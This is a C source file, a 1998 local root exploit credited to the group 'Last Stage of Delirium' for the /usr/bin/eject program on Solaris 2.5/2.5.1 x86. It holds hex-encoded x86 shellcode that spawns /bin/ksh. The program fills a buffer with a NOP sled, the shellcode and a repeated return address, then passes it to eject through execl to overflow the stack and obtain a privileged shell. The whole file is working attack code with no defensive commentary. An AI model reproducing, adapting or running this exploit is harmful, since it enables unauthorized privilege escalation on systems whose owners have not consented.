/*## copyright LAST STAGE OF DELIRIUM apr 1998 poland        *://lsd-pl.net/ #*/
/*## /usr/bin/eject                                                          #*/

#define ADRNUM 344-300
#define NOPNUM 265+300

char shellcode[]=
    "\xeb\x1b"             /* jmp     <shellcode+30>       */
    "\x33\xd2"             /* xorl    %edx,%edx            */
    "\x58"                 /* popl    %eax                 */
    "\x8d\x78\x14"         /* leal    0x14(%eax),edi       */
    "\x52"                 /* pushl   %edx                 */
    "\x57"                 /* pushl   %edi                 */
    "\x50"                 /* pushl   %eax                 */
    "\xab"                 /* stosl   %eax,%es:(%edi)      */
    "\x92"                 /* xchgl   %eax,%edx            */
    "\xab"                 /* stosl   %eax,%es:(%edi)      */
    "\x88\x42\x08"         /* movb    %al,0x8(%edx)        */
    "\x83\xef\x3c"         /* subl    $0x3c,%edi           */
    "\xb0\x9a"             /* movb    $0x9a,%al            */
    "\xab"                 /* stosl   %eax,%es:(%edi)      */
    "\x47"                 /* incl    %edi                 */
    "\xb0\x07"             /* movb    $0x7,%al             */
    "\xab"                 /* stosl   %eax,%es:(%edi)      */
    "\xb0\x3b"             /* movb    $0x3b,%al            */
    "\xe8\xe0\xff\xff\xff" /* call    <shellcode+2>        */
    "/bin/ksh"
;

char jump[]=
    "\x8b\xc4"             /* movl    %esp,%eax            */
    "\xc3"                 /* ret                          */
;

main(int argc,char **argv){
    char buffer[1024],adr[4],*b; 
    int i;

    printf("copyright LAST STAGE OF DELIRIUM apr 1998 poland  //lsd-pl.net/\n");
    printf("/usr/bin/eject for solaris 2.5 2.5.1 x86\n\n");

    *((unsigned long*)adr)=(*(unsigned long(*)())jump)()-130;

    b=buffer;
    for(i=0;i<NOPNUM;i++) *b++=0x90;
    for(i=0;i<strlen(shellcode);i++) *b++=shellcode[i];
    for(i=0;i<ADRNUM;i++) *b++=adr[i%4];
    *b=0;

    execl("/usr/bin/eject","eject","-f",buffer,0);
}

